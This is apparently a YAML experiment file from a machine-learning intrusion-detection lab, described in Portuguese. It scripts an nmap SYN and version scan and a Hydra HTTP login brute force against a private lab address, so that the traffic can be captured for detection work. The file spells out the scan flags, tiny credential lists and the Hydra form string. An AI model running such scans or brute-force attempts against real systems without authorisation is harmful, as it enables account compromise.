# ML IDS Lab — Scan + Brute HTTP
version: 1
name: exp_scan_brute
description: Nmap seguido de tentativa de força bruta HTTP via Hydra.
targets:
  victim_ip: "192.168.56.12"
capture:
  rotate_seconds: 300
  rotate_size_mb: 100

brute:
  users_inline: ["admin", "user", "test"]
  pass_inline: ["123456", "password", "tcc2025"]

actions:
  - name: custom
    title: "Preparar listas de usuários/senhas"
    description: "Gera ~/users.txt e ~/passwords.txt se não existirem."
    command: |
      set -e
      test -f ~/users.txt     || printf "admin\nuser\ntest\n" > ~/users.txt
      test -f ~/passwords.txt || printf "123456\npassword\ntcc2025\n" > ~/passwords.txt

  - name: nmap_scan
    params:
      flags: "-sS -sV -T4 --open"
      ports: "1-1024"
      output: "~/exp_nmap/scan"

  - name: hydra_brute
    params:
      service: "http-post-form"
      port: 80
      path: "/login:username=^USER^&password=^PASS^:F=Invalid"
      user: "~/users.txt"
      pass_list: "~/passwords.txt"
      output: "~/exp_brute/hydra_http"
